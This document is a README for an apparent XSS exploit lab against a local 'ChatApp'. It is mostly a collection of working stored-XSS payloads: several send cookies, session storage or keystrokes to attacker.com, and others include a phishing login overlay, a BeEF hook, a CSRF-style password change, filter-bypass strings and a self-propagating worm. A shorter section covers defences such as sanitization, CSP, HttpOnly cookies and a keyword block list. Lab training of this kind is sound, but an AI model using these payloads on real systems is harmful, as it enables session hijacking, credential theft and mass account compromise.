# ChatApp - Cross-Site Scripting (XSS) Exploits

## Overview
These exploits target stored XSS vulnerabilities in the ChatApp's message system.

## Target Application
- **Project**: ChatApp
- **Port**: 5006
- **Vulnerable Feature**: Chat messages (stored in database, displayed to all users)
- **Vulnerability**: No HTML sanitization on message display

## Prerequisites
```bash
# Ensure ChatApp is running
docker-compose up -d chatapp
```

## Exploits

### stored_xss_chat.py
Injects malicious JavaScript into chat messages that execute when other users view them.

**Usage:**
```bash
python3 stored_xss_chat.py
```

**What it does:**
- Registers a user account
- Logs in to get session
- Posts messages containing JavaScript payloads
- Stored in database and executed for all users viewing the chat
- Can steal cookies, perform actions as victims, or deface the page

**Expected Output:**
```
[+] Targeting: http://localhost:5006
[+] Registering user: attacker
[+] Login successful
[+] Injecting XSS payload in chat...
[+] Payload: <script>alert('XSS')</script>
[+] Message posted successfully!
[+] XSS will trigger when users view the chat
```

## XSS Payloads

### 1. Basic Alert (Proof of Concept)
```html
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
```

### 2. Cookie Stealing
```html
<script>
document.location='http://attacker.com/steal.php?cookie='+document.cookie;
</script>

<img src=x onerror="fetch('http://attacker.com/steal?c='+btoa(document.cookie))">
```

### 3. Session Hijacking
```html
<script>
var xhr = new XMLHttpRequest();
xhr.open('POST', 'http://attacker.com/steal', true);
xhr.send(JSON.stringify({
    cookie: document.cookie,
    localStorage: localStorage,
    sessionStorage: sessionStorage
}));
</script>
```

### 4. Keylogger
```html
<script>
document.onkeypress = function(e) {
    fetch('http://attacker.com/log?key=' + e.key);
}
</script>
```

### 5. Phishing Attack
```html
<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:9999">
<h2>Session Expired - Please Login Again</h2>
<form action="http://attacker.com/phish" method="POST">
    Username: <input name="user"><br>
    Password: <input type="password" name="pass"><br>
    <input type="submit" value="Login">
</form>
</div>
```

### 6. Admin Action (CSRF via XSS)
```html
<script>
// Delete all messages as current user
fetch('/api/messages/delete-all', {
    method: 'POST',
    credentials: 'include'
});

// Change user password
fetch('/api/change-password', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({password: 'hacked123'}),
    credentials: 'include'
});
</script>
```

### 7. BeEF Hook (Browser Exploitation Framework)
```html
<script src="http://attacker.com:3000/hook.js"></script>
```

## Manual Testing

### Via Web Interface:
1. Login at http://localhost:5006
2. Post these messages:
```html
<script>alert(document.cookie)</script>
<img src=x onerror="javascript:alert('XSS')">
<svg/onload=alert('XSS')>
<iframe src="javascript:alert('XSS')">
```

### Via curl:
```bash
# Login
curl -c cookies.txt -X POST http://localhost:5006/login \
  -H "Content-Type: application/json" \
  -d '{"username":"test","password":"test"}'

# Post XSS payload
curl -b cookies.txt -X POST http://localhost:5006/message \
  -H "Content-Type: application/json" \
  -d '{"message":"<script>alert(1)</script>"}'

# Visit chat to trigger
curl -b cookies.txt http://localhost:5006/chat
```

## Advanced Exploitation

### Bypass Filters (if basic filtering exists):
```html
<!-- Case variation -->
<ScRiPt>alert(1)</sCrIpT>

<!-- Encoding -->
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">

<!-- Protocol variations -->
<a href="javascript:alert(1)">Click</a>
<a href="data:text/html,<script>alert(1)</script>">Click</a>

<!-- Event handlers -->
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<marquee onstart=alert(1)>

<!-- Without script tags -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<details open ontoggle=alert(1)>
```

### Self-Propagating XSS Worm:
```html
<script>
// Read the chat message containing this script
var payload = document.querySelector('#message-123').innerHTML;

// Post the same payload as a new message
fetch('/api/message', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({message: payload}),
    credentials: 'include'
});
</script>
```

## Defense Recommendations

### 1. HTML Sanitization (Server-Side)
```python
import bleach

ALLOWED_TAGS = ['b', 'i', 'u', 'em', 'strong', 'p', 'br']
ALLOWED_ATTRIBUTES = {}

def sanitize_html(dirty_html):
    clean = bleach.clean(
        dirty_html,
        tags=ALLOWED_TAGS,
        attributes=ALLOWED_ATTRIBUTES,
        strip=True
    )
    return clean

# Use before storing:
message = sanitize_html(request.json.get('message'))
```

### 2. Content Security Policy (CSP)
```python
from flask import Flask
app = Flask(__name__)

@app.after_request
def set_csp(response):
    response.headers['Content-Security-Policy'] = (
        "default-src 'self'; "
        "script-src 'self'; "
        "style-src 'self' 'unsafe-inline'; "
        "img-src 'self' data: https:; "
        "font-src 'self'; "
        "connect-src 'self'; "
        "frame-ancestors 'none';"
    )
    return response
```

### 3. Output Encoding (Template-Side)
```html
<!-- Jinja2 auto-escaping (enabled by default) -->
{{ message }}  <!-- Automatically escapes HTML -->

<!-- Manual escaping if needed -->
{{ message | escape }}

<!-- For attributes -->
<div data-message="{{ message | forceescape }}">
```

### 4. HttpOnly Cookies
```python
from flask import Flask, session

app = Flask(__name__)
app.config.update(
    SESSION_COOKIE_HTTPONLY=True,  # Prevents JavaScript access
    SESSION_COOKIE_SECURE=True,    # HTTPS only
    SESSION_COOKIE_SAMESITE='Lax'  # CSRF protection
)
```

### 5. Input Validation
```python
import re

def validate_message(message):
    # Remove all HTML tags
    clean = re.sub(r'<[^>]*>', '', message)
    
    # Block dangerous keywords
    dangerous = ['script', 'onerror', 'onload', 'onclick', 'javascript:']
    for word in dangerous:
        if word in clean.lower():
            raise ValueError("Dangerous content detected")
    
    return clean
```

## Testing for XSS

### Automated Scanning:
```bash
# XSStrike
python3 xsstrike.py -u "http://localhost:5006/message" --data '{"message":"XSS"}'

# Burp Suite Intruder
# Use XSS payload lists from: https://github.com/payloadbox/xss-payload-list
```

### Manual Checklist:
- [ ] Test in all input fields
- [ ] Test URL parameters
- [ ] Test HTTP headers (User-Agent, Referer)
- [ ] Test file uploads (filename, content)
- [ ] Test different contexts (HTML, JavaScript, CSS, URL)
- [ ] Test encoding bypasses
- [ ] Test polyglot payloads

## Notes
**WARNING**: Stored XSS is extremely dangerous because:
- Affects ALL users who view the content
- Persists across sessions
- No user interaction needed (besides viewing page)
- Can lead to mass account compromise

**Attack Scenarios:**
1. Steal admin session cookies → takeover admin account
2. Install keylogger → capture credentials
3. Modify page content → phishing attack
4. Spread XSS worm → infect all users
5. Perform actions as victim → mass spam, data theft

## Related Exploits
- See `../sqli/` for database attacks to escalate XSS
- See `../csrf/` for combining XSS with CSRF
- Combine XSS + SQLi to create super-admin accounts
